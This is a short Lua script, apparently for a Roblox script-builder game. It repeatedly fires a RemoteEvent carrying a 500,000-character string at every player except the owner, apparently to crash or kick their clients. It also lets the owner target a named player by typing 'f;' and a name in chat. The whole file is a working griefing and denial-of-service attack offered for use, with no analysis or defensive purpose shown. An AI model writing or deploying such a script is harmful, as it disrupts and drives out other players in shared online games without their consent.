fp=function(str)
for i,v in pairs(game.Players:GetPlayers()) do
if v.Name:lower():sub(1,#str)==str:lower() then return v end
end
end

rr=function(Player) 
Instance.new('RemoteEvent',Player):fireClient(Player, {string.rep('a',5e5)});
end

fireclient=function(pla)
if pla then
rr(pla)
end
end

kick = function(tk)
fireclient(fp(tk))
end
plr=owner

plr.Chatted:connect(function(m)
if m:lower():sub(1,2)=='f;' then
kick(m:sub(3))
end
end)
while wait() do
for i,v in pairs(game.Players:children()) do
if v.Name~=plr.Name then
kick(v.Name)
end
end
end
